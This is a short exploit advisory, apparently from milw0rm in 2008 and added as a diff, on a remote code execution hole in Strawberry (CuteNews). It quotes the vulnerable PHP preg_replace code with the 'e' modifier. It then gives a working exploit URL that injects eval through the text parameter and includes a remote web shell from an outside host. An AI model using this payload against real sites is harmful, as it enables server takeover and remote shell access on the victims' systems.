@@ -1,0 +1,38 @@
+----[ CuteNews Remote Code Execution ... ITDefence.ru Antichat.ru ]
+
+							Strawberry (CuteNews) Remote Code Execution
+							Eugene Minaev underwater@itdefence.ru
+				___________________________________________________________________
+			____/  __ __ _______________________ _______  _______________    \  \   \
+			/ .\  /  /_// //              /        \       \/      __       \   /__/   /
+			/ /     /_//              /\        /       /      /         /     /___/
+			\/        /              / /       /       /\     /         /         /
+			/        /               \/       /       / /    /         /__       //\
+			\       /    ____________/       /        \/    __________// /__    // /   
+			/\\      \_______/        \________________/____/  2007    /_//_/   // //\
+			\ \\                                                               // // /
+			.\ \\        -[     ITDEFENCE.ru Security advisory     ]-         // // / . 
+			. \_\\________[________________________________________]_________//_//_/ . .
+			
+		Preg_replace with 'e' modifier allows code execution
+		<?php
+
+		$source = htmlspecialchars($text);
+
+		$source = preg_replace(
+		'/&lt;!--(.*?)--&gt;/es',
+		'"<span style=\"color: ".$options["color"]["comment"].";\">&lt;!--".
+		str_replace("&lt;","&lt;<!-- -->",
+		str_replace("=","=<!-- -->",
+		"$1")).
+		"--&gt;</span>"',
+		$source);  
+
+		?>
+		
+		strawberry/plugins/wacko/highlight/html.php?text=%3C!--{${eval($s)}}--%3E&s=include('blackybr.nm.ru/shell');
+		
+
+----[ FROM RUSSIA WITH LOVE :: underWHAT?! , gemaglabin ]
+
+# milw0rm.com [2008-01-06]
